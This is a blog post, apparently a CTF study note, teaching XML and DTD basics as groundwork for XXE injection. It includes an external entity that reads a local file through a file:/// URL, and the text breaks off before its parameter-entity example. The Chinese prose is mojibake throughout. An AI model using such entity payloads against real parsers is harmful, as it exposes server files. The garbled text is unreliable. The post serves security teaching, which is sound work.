<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Sl0th">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://sloth31.github.io/2022/04/22/xxeå­¦ä¹ /"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="XXEXXEå…¨ç§°XML External Entity InjectionXMLåœ¨å¼•å…¥å¤–éƒ¨å®ä½“çš„æ—¶å€™å®Œæˆæ³¨å…¥æ”»å‡»ç§°ä¸ºXXEã€‚ å‰ç½®çŸ¥è¯†XMLè¯­è¨€XMLæ˜¯ä¸€ç§ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®çš„å¯æ‰©å±•æ ‡è®°è¯­è¨€ã€‚ XMLç”¨äºä¼ è¾“å’Œæ•°æ®å­˜å‚¨ã€‚HTMLç”¨äºæ˜¾ç¤ºæ•°æ® è¯­æ³•è§„åˆ™ 123451.æ‰€æœ‰çš„XMLå…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾  e.g. &lt;note&gt; &lt;&#x2F;note&gt;2.XMLæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ3.X">
<meta property="og:type" content="article">
<meta property="og:title" content="XXEå­¦ä¹ ">
<meta property="og:url" content="http://sloth31.github.io/2022/04/22/XXE%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Sl0th&#39;s Blog">
<meta property="og:description" content="XXEXXEå…¨ç§°XML External Entity InjectionXMLåœ¨å¼•å…¥å¤–éƒ¨å®ä½“çš„æ—¶å€™å®Œæˆæ³¨å…¥æ”»å‡»ç§°ä¸ºXXEã€‚ å‰ç½®çŸ¥è¯†XMLè¯­è¨€XMLæ˜¯ä¸€ç§ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®çš„å¯æ‰©å±•æ ‡è®°è¯­è¨€ã€‚ XMLç”¨äºä¼ è¾“å’Œæ•°æ®å­˜å‚¨ã€‚HTMLç”¨äºæ˜¾ç¤ºæ•°æ® è¯­æ³•è§„åˆ™ 123451.æ‰€æœ‰çš„XMLå…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾  e.g. &lt;note&gt; &lt;&#x2F;note&gt;2.XMLæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ3.X">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003178.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003137.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003001.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003488.jpg">
<meta property="article:published_time" content="2022-04-21T16:02:32.000Z">
<meta property="article:modified_time" content="2024-07-03T16:12:41.684Z">
<meta property="article:author" content="Sl0th">
<meta property="article:tag" content="xxe">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003178.jpg">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/img/fav.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/img/fav.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/img/fav.ico">
    <!--- Page Info-->
    
    <title>
        
            XXEå­¦ä¹  | Sl0th&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"sloth31.github.io","root":"/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"æ¨èé˜…è¯»","limit":3,"mobile_limit":2,"placeholder":"/img/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/img/day.jpg","dark":"/img/night.jpg"},"title":"ğŸ‘‹Welcome to Sl0th's BlogğŸ‰","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



<main class="page-container" id="swup">

    

    <div class="main-content-container flex flex-col justify-between min-h-dvh">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/img/fav.ico" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Sl0th&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    é¦–é¡µ
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    å½’æ¡£
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags"
                                        >
                                    <i class="fa-regular fa-tags fa-fw"></i>
                                    æ ‡ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories"
                                        >
                                    <i class="fa-regular fa-folder fa-fw"></i>
                                    åˆ†ç±»
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    å…³äº
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://github.com/sloth31">
                                                    GITHUB
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="http://sl0th.top/">
                                                    BLOG
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                é¦–é¡µ
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                å½’æ¡£
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags"
                        >
                            <span>
                                æ ‡ç­¾
                            </span>
                            
                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories"
                        >
                            <span>
                                åˆ†ç±»
                            </span>
                            
                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                å…³äº
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://github.com/sloth31">GITHUB</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="http://sl0th.top/">BLOG</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
        <div class="label text-third-text-color text-sm">æ ‡ç­¾</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">åˆ†ç±»</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
        <div class="label text-third-text-color text-sm">æ–‡ç« </div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">XXEå­¦ä¹ </h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/img/avatar.JPG">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Sl0th</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2022-04-22 00:02:32</span>
        <span class="mobile">2022-04-22 00:02:32</span>
        <span class="hover-info">åˆ›å»º</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-07-04 00:12:41</span>
            <span class="mobile">2024-07-04 00:12:41</span>
            <span class="hover-info">æ›´æ–°</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/ctf/">ctf</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/xxe/">xxe</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/web/">web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXEå…¨ç§°XML External Entity InjectionXMLåœ¨å¼•å…¥å¤–éƒ¨å®ä½“çš„æ—¶å€™å®Œæˆæ³¨å…¥æ”»å‡»ç§°ä¸ºXXEã€‚</p>
<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="XMLè¯­è¨€"><a href="#XMLè¯­è¨€" class="headerlink" title="XMLè¯­è¨€"></a>XMLè¯­è¨€</h3><p>XMLæ˜¯ä¸€ç§ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®çš„å¯æ‰©å±•æ ‡è®°è¯­è¨€ã€‚</p>
<p>XMLç”¨äº<strong>ä¼ è¾“å’Œæ•°æ®å­˜å‚¨</strong>ã€‚HTMLç”¨äºæ˜¾ç¤ºæ•°æ®</p>
<p>è¯­æ³•è§„åˆ™</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.æ‰€æœ‰çš„XMLå…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾  e.g. &lt;note&gt; &lt;/note&gt;</span><br><span class="line">2.XMLæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ</span><br><span class="line">3.XMLå¿…é¡»æ­£ç¡®åµŒå¥—</span><br><span class="line">4.XMLå±æ€§å€¼å¿…é¡»åŠ å¼•å·&quot;&quot;</span><br><span class="line">5.å®ä½“å¼•ç”¨ï¼šåœ¨æ ‡ç­¾å±æ€§ï¼Œæˆ–è€…å¯¹åº”ä½ç½®å€¼å¯èƒ½å‡ºç°&lt;&gt;ç¬¦å·ï¼Œè¿™äº›åœ¨å¯¹åº”çš„xmlä¸­éƒ½æ˜¯ç‰¹æ®Šå«ä¹‰çš„ï¼Œé‚£ä¹ˆå¿…é¡»ä½¿ç”¨å¯¹åº”htmlçš„å®ä½“å¯¹åº”çš„è¡¨ç¤º:ä¾‹å¦‚ï¼Œ&lt;message&gt;if salary &lt; 1000 then &lt;/message&gt;å¦‚æœæŠŠè¿™ä¸ªâ€œ&lt;â€æ”¾åœ¨å…ƒç´ ä¸­ï¼Œé‚£ä¹ˆè§£æå™¨ä¼šæŠŠä»–å½“æˆæ–°å…ƒç´ çš„å¼€å§‹ï¼Œå°±ä¼šå‘ç”ŸæŠ¥é”™ã€‚ä¸ºäº†é¿å…è¿™ä¸ªé”™è¯¯ä½¿ç”¨å®ä½“å¼•ç”¨æ¥ä»£æ›¿&lt;message&gt;if salary &amp;lt; 1000 then &lt;/message&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>xmlç»“æ„</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XML æ–‡æ¡£å£°æ˜ï¼Œåœ¨æ–‡æ¡£çš„ç¬¬ä¸€è¡Œ</span><br><span class="line">XML æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œå³DTDï¼ŒXXE æ¼æ´æ‰€åœ¨çš„åœ°æ–¹</span><br><span class="line">XML æ–‡æ¡£å…ƒç´ </span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>æ ¹æ® DOMï¼ŒXML æ–‡æ¡£ä¸­çš„æ¯ä¸ªæˆåˆ†éƒ½æ˜¯ä¸€ä¸ª<strong>èŠ‚ç‚¹</strong>ã€‚</p>
<p>DOM æ˜¯è¿™æ ·è§„å®šçš„ï¼š</p>
<ul>
<li>æ•´ä¸ªæ–‡æ¡£æ˜¯ä¸€ä¸ªæ–‡æ¡£èŠ‚ç‚¹</li>
<li>æ¯ä¸ª XML æ ‡ç­¾æ˜¯ä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹</li>
<li>åŒ…å«åœ¨ XML å…ƒç´ ä¸­çš„æ–‡æœ¬æ˜¯æ–‡æœ¬èŠ‚ç‚¹</li>
<li>æ¯ä¸€ä¸ª XML å±æ€§æ˜¯ä¸€ä¸ªå±æ€§èŠ‚ç‚¹</li>
<li>æ³¨é‡Šå±äºæ³¨é‡ŠèŠ‚ç‚¹</li>
</ul>
<p><u>*<year>2005</year>*ï¼Œå…ƒç´ èŠ‚ç‚¹ <year>ï¼Œæ‹¥æœ‰ä¸€ä¸ªå€¼ä¸º â€œ2005â€ çš„æ–‡æœ¬èŠ‚ç‚¹ã€‚â€2005â€ <em>ä¸æ˜¯</em> <year> å…ƒç´ çš„å€¼ï¼</u></p>
</blockquote>
<h3 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a><strong>XML DTD</strong></h3><p>1ã€æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚</p>
<p>2ã€DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ª<strong>å¤–éƒ¨å¼•ç”¨</strong>ã€‚</p>
<blockquote>
<p> ç¬¬äºŒæ¡æ˜¯é‡ç‚¹ï¼Œä¹Ÿæ˜¯XXEæ¼æ´äº§ç”Ÿçš„åŸå› ï¼ŒDTDå¯ä»¥<strong>å®šä¹‰å¤–éƒ¨å®ä½“å¹¶å¼•ç”¨</strong></p>
</blockquote>
<p><strong>å†…éƒ¨å£°æ˜DTD</strong></p>
<p>è‹¥DTDè¦åœ¨XMLæ–‡æ¡£ä¸­ä½¿ç”¨ï¼Œä»–éœ€è¦åŒ…å«åœ¨Â·DOCTYPEå£°æ˜ä¸­</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--xmlå£°æ˜--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">playwin</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;playwin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resume</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> <span class="symbol">&amp;name;</span> <span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resume</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>DOCTYPEå£°æ˜è¯­æ³• <code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code></li>
<li>å®ä½“å¼•ç”¨ï¼š<code>&lt;!ENTITY å®ä½“å &quot;å®ä½“å€¼&quot;&gt;</code></li>
<li>ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&amp;), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· ( ; )ã€‚</li>
<li>å£°æ˜ name çš„å€¼ä¸º playwin ï¼Œä¸‹é¢å¼•ç”¨ &amp;nameï¼›xmlä¼šè‡ªåŠ¨è§£æä¸ºä»–çš„å€¼ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå¦åˆ™æŠ¥é”™</li>
</ul>
</blockquote>
<p><strong>å¤–éƒ¨å£°æ˜DTD</strong></p>
<p>å£°æ˜å¤–éƒ¨å®ä½“(å¤–éƒ¨å®ä½“ä¸æ˜¯xmlæœ¬èº«å·²å®šä¹‰çš„å®ä½“)</p>
<p>è¯­æ³•</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY å®ä½“åå­— <span class="keyword">SYSTEM</span> <span class="string">&quot;URL&quot;</span>&gt;</span>  <span class="comment">&lt;!--å¯ä»¥ä½¿ç”¨åè®®è¯»å–å¤–éƒ¨æ•°æ®--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY å®ä½“åå­— <span class="keyword">PUBLIC</span> <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URL&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///Users/sloth/1.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æ¡ˆä¾‹</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">name</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">hack3r</span> <span class="string">&quot;http://www.chenguanxin.com&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;hack3r;<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>å¤–éƒ¨å£°æ˜å®ä½“å¤–éƒ¨å®ä½“ç”¨æ¥å¼•ç”¨å¤–éƒ¨èµ„æº,æœ‰ä¸¤ä¸ªå…³é”®å­—<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ä¸¤ä¸ª,è¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœº</li>
<li>æ ¹æ®ä¸åŒç¯å¢ƒä¸åŒåè®®è¯»å–å¤–éƒ¨æ•°æ®</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003178.jpg"
                      alt="sÃŸ"
                ></li>
</ul>
</blockquote>
<p><strong>å®ä½“çš„åµŒå¥—</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %å®ä½“åç§° &quot;å€¼&quot;&gt; &lt;!--å†…éƒ¨--&gt;</span><br><span class="line">&lt;!ENTITY %å®ä½“åç§° SYSTEM &quot;URL&quot;&gt; &lt;!--å¤–éƒ¨--&gt;</span><br></pre></td></tr></table></figure></div>

<p>å®ä¾‹:</p>
